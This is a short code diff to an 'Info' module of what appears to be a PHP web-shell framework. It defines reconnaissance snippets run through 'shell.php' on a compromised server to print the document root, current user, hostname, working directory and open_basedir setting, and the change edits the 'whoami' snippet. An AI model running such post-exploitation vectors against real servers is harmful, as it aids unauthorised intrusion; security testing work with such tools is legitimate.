@@ -19,7 +19,7 @@ class Info(Module):
 
     def _set_vectors(self):
             self.support_vectors.add_vector('document_root', 'shell.php', "@print($_SERVER['DOCUMENT_ROOT']);"),
-            self.support_vectors.add_vector('whoami', 'shell.php', "$u = get_current_user(); if(!$u) { $u=posix_getpwuid(posix_geteuid()); if($u) { $u = $u['name']; } else { $u=getenv('username'); } } print($u);"),
+            self.support_vectors.add_vector('whoami', 'shell.php', "$u=posix_getpwuid(posix_geteuid()); if($u) { $u = $u['name']; } else { $u=getenv('username'); } print($u);"),
             self.support_vectors.add_vector('hostname', 'shell.php', "@print(gethostname());"),
             self.support_vectors.add_vector('cwd', 'shell.php', "@print(getcwd());"),
             self.support_vectors.add_vector('open_basedir', 'shell.php', "$v=@ini_get('open_basedir'); if($v) print($v);"),
